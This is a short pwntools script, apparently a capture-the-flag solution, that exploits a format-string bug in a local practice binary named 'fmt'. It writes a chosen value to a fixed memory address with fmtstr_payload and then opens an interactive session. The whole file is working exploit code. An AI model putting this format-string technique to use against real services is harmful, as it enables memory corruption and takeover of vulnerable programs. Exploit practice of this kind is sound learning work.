from pwn import *

#context.log_level='debug'

#io = remote('127.0.0.1', 4000)
io = process('fmt')

x_addr = 0x804a02c

io.recvline()
io.sendline(fmtstr_payload(7,{x_addr:339117970}))

io.interactive()
